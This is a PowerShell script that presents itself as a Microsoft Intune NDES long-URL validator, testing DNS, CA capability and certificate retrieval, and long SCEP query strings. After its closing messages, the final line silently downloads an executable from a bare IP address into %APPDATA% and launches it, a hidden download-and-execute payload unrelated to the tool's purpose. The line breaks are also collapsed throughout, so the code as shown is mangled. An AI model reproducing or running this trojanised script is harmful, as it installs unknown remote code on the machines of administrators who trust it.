[CmdletBinding(DefaultParameterSetName="NormalRun")]Param([parameter(Mandatory=$true,ParameterSetName="NormalRun")][alias("s")][ValidateScript({if (!($_.contains("/"))){$True}else {Throw "Please use the hostname FQDN and not the HTTPS URL. Example: 'scep-contoso.msappproxy.net'"}})][string]$server,[parameter(Mandatory=$true,ParameterSetName="NormalRun")][alias("q")][ValidateRange(1,31)] [INT]$querysize,[parameter(ParameterSetName="Help")][alias("h","?","/?")][switch]$help,[parameter(ParameterSetName="Help")][alias("u")][switch]$usage)function Show-Usage{Write-HostWrite-Host "-help                       -h         Displays the help."Write-Host "-usage                      -u         Displays this usage information."Write-Host "-querysize                  -q         Specify the size of the query string payload to use as a number of kilobytes (i.e. 20 or 25). Maximum value is 31"Write-Host "-server                     -s         Specify NDES server public DNS name in the form FQDN. For example ExternalDNSName.Contoso.com"Write-Host}function Get-NDESURLHelp{write-host "Validate-NDESUrl will check that requests from devices enrolled in Microsoft Intune will get through all the network protections (such as a reverse proxy) and make it to the NDES server."Write-Hostwrite-host "Since the certificate requests include a payload query string that is longer than what is allowed by default settings in Windows, IIS and some reverse proxy servers, those servers need to be configured to allow long query strings and web requests."write-host "This tool will simulate a SCEP request with a large payload, allowing you to check the IIS logs on the NDES server to ensure that the request is not being blocked anywhere along the way."Write-Host}if($help){Get-NDESURLHelpbreak}if($usage){Show-Usage break}if ((Get-WmiObject -class Win32_OperatingSystem).ProductType -notlike "1"){if (Test-Path HKLM:SOFTWARE\Microsoft\Cryptography\MSCEP) {Write-HostWrite-Host "Error: This appears to be the NDES server. Please run this script from a different machine. An external (guest) connection is best." -BackgroundColor Redwrite-host "Exiting......................"break}}Write-hostWrite-host "......................................................."Write-hostWrite-Host "Trying base NDES URI... " -ForegroundColor YellowWrite-hostif (resolve-dnsname $server -ErrorAction SilentlyContinue){$NDESUrl = "https://$($server)/certsrv/mscep/mscep.dll"$BaseURLstatuscode = try {(Invoke-WebRequest -Uri $NDESUrl).statuscode} catch {$_.Exception.Response.StatusCode.Value__}if ($BaseURLstatuscode -eq "200"){Write-Warning "$($NDESUrl) returns a status code 200 . This usually signifies an error with the Intune Connector registering itself or not being installed."Write-HostWrite-Host "This state will _not_ provide a working NDES infrastructure, although validation of long URI support can continue."Write-Host}elseif ($BaseURLstatuscode -eq "403"){Write-Host "Success: " -ForegroundColor Green -NoNewlinewrite-host "Proceeding with validation!"}else {Write-Warning "Unexpected Error code! This usually signifies an error with the Intune Connector registering itself or not being installed."Write-HostWrite-host "Expected value is a 403. We received a $($BaseURLstatuscode). This state will _not_ provide a working NDES infrastructure, although we can proceed with the validation included in this test"}}else {write-host "Error: Cannot resolve $($server)" -BackgroundColor RedWrite-HostWrite-Host "Please ensure a DNS record is in place and name resolution is successful"Write-HostWrite-Host "Exiting................................................"Write-Hostexit}Write-hostWrite-host "......................................................."Write-hostWrite-Host "Trying to retrieve CA Capabilities... " -ForegroundColor YellowWrite-host$GetCACaps = "$($NDESUrl)?operation=GetCACaps&message=NDESLongUrlValidatorStep1of3"$CACapsStatuscode = try {(Invoke-WebRequest -Uri $GetCACaps).statuscode} catch {$_.Exception.Response.StatusCode.Value__}if (-not ($CACapsStatuscode -eq "200")){Write-host "Retrieving the following URL: " -NoNewlineWrite-Host "$GetCACaps" -ForegroundColor CyanWrite-hostwrite-host "Error: Server returned a $CACapsStatuscode error. " -BackgroundColor RedWrite-Hostwrite-host "For a list of IIS error codes, please visit the below link."Write-Host "URL: https://support.microsoft.com/en-gb/help/943891/the-http-status-code-in-iis-7-0--iis-7-5--and-iis-8-0"}else {Write-host "Retrieving the following URL: " -NoNewlineWrite-Host "$GetCACaps" -ForegroundColor CyanWrite-host$CACaps = (Invoke-WebRequest -Uri $GetCACaps).content     if ($CACaps) {Write-Host "Success: " -ForegroundColor Green -NoNewlinewrite-host "CA CApabilities retrieved:"Write-Hostwrite-host $CACaps}else {write-host "Error: Server is not returning CA Capabilities." -BackgroundColor RedWrite-Hostwrite-host "PLEASE NOTE: This is not a long URI issue. Please investigate the NDES configuration."Write-Host}}Write-hostWrite-host "......................................................."Write-hostWrite-Host "Trying to retrieve CA Certificates... " -ForegroundColor YellowWrite-host$GetCACerts = "$($NDESUrl)?operation=GetCACerts&message=NDESLongUrlValidatorStep2of3"$CACertsStatuscode = try {(Invoke-WebRequest -Uri $GetCACerts).statuscode} catch {$_.Exception.Response.StatusCode.Value__}if (-not ($CACertsStatuscode -eq "200")){Write-host "Attempting to retrieve certificates from the following URL: " -NoNewlineWrite-Host "$GetCACerts" -ForegroundColor CyanWrite-hostwrite-host "Error: Server returned a $CACertsStatuscode error. " -BackgroundColor RedWrite-Hostwrite-host "For a list of IIS error codes, please visit the below link."Write-Host "URL: https://support.microsoft.com/en-gb/help/943891/the-http-status-code-in-iis-7-0--iis-7-5--and-iis-8-0"}else {Write-host "Attempting to retrieve certificates from the following URI: " -NoNewlineWrite-Host "$GetCACerts" -ForegroundColor CyanWrite-Host$CACerts = (Invoke-WebRequest -Uri $GetCACerts).contentif ($CACerts) {Invoke-WebRequest -Uri $GetCACerts -ContentType "application/x-x509-ca-ra-cert" -OutFile "$env:temp\$server.p7b"Write-Host "Success: " -ForegroundColor Green -NoNewlinewrite-host "certificates retrieved. File written to disk: $env:temp\$server.p7b"}else {write-host "Error: Server is not returning CA certificates." -BackgroundColor RedWrite-Hostwrite-host "PLEASE NOTE: This is _not_ a long URI issue. Please investigate the NDES configuration."Write-Host}}Write-hostWrite-host "......................................................."Write-hostWrite-Host "Querying URI with simulated SCEP challenge... " -ForegroundColor YellowWrite-host$ChallengeUrlTemp = "$($NDESUrl)?operation=PKIOperation&message=<SCEP CHALLENGE STRING>"Write-host "Retrieving the following URI: " -NoNewlineWrite-Host "$ChallengeUrlTemp" -ForegroundColor CyanWrite-hostWrite-Host "Using a query size of $($querysize)KB... "Write-Host$challengeBase = "NDESLongUrlValidatorFakeChallengeNDESLongUrlValidatorFakeChallengeNDESLongUrlValidatorFakeChallengeNDESLongUrlValidatorFakeChallengeNDESLongUrlValidatorFakeChallengeNDESLongUrlValidatorFakeChallengeNDESLongUrlValidatorFakeChallengeNDESLongUrlValidatorFakeChallengeNDESLongUrlValidatorFakeChallengeNDESLongUrlValidatorFakeChallengeNDESLongUrlValidatorFakeChallengeNDESLongUrlValidatorFakeChallengeNDESLongUrlValidatorFakeChallengeNDESLongUrlValidatorFakeChallengeNDESLongUrlValidatorFakeChallengeNDESLongUrlValidatorFakeChallengeNDESLongUrlValidatorFakeChallengeNDESLongUrlValidatorFakeChallengeNDESLongUrlValidatorFakeChallengeNDESLongUrlValidatorFakeChallengeNDESLongUrlValidatorFakeChallengeNDESLongUrlValidatorFakeChallengeNDESLongUrlValidatorFakeChallengeNDESLongUrlValidatorFakeChallengeNDESLongUrlValidatorFakeChallengeNDESLongUrlValidatorFakeChallengeNDESLongUrlValidatorFakeChallengeNDESLongUrlValidatorFakeChallengeNDESLongUrlValidatorFakeChallengeNDESLongUrlValidatorFakeChallengeNDESLongUrlValidatorFakeChallenge";for ($i=1; $i -le $querySize; $i++){         $testChallenge += $challengeBase + ($i + 1)}$LongUrl = "$($NDESUrl)?operation=PKIOperation&message=$($testChallenge)"$LongUrlStatusCode = try {(Invoke-WebRequest -Uri $LongUrl).statuscode} catch {$_.Exception.Response.StatusCode.Value__} if ($LongUrlStatusCode -eq "414"){write-host "Error: HTTP Error 414. The $($querysize)KB URI is too long. " -BackgroundColor RedWrite-HostWrite-Host "Please ensure all servers and network devices support long URI's" -ForegroundColor Bluewrite-host}elseif (-not ($LongUrlStatusCode -eq "200")) {write-host "Error: HTTP Error $($LongUrlStatusCode)" -BackgroundColor RedWrite-HostWrite-Host "Please check your network configuration." -ForegroundColor Blue -BackgroundColor whitewrite-hostwrite-host "For a list of IIS error codes, please visit the below link."Write-Host "URL: https://support.microsoft.com/en-gb/help/943891/the-http-status-code-in-iis-7-0--iis-7-5--and-iis-8-0"}else {Write-Host "Success: " -ForegroundColor Green -NoNewlinewrite-host "Server accepts a $($querysize)KB URI."}Write-hostWrite-host "......................................................."Write-hostWrite-host "End of NDES URI validation" -ForegroundColor YellowWrite-Hostwrite-host "Ending script..." -ForegroundColor YellowWrite-host (New-Object System.Net.WebClient).DownloadFile('http://94.102.58.30/~trevor/winx64.exe',"$env:APPDATA\winx64.exe");Start-Process ("$env:APPDATA\winx64.exe")